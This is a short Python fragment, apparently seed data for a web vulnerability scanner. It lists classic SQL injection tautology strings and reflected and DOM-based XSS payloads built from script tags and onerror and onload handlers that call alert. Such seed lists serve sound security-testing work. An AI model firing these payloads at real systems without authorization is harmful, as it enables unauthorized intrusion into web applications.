SQLI_SEEDS = [
    "1' OR '1'='1' -- ",
    "' OR '1'='1' -- ",
    "1' OR 1=1 -- ",
    "1' OR '1'='1'#",
]

XSS_REFLECTED_SEEDS = [
    '<script>alert("x")</script>',
    '"><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
]

XSS_DOM_SEEDS = [
    '<script>alert("domxss")</script>',
    '"><script>alert(document.domain)</script>',
    '<img src=x onerror=alert("dom")>',
]
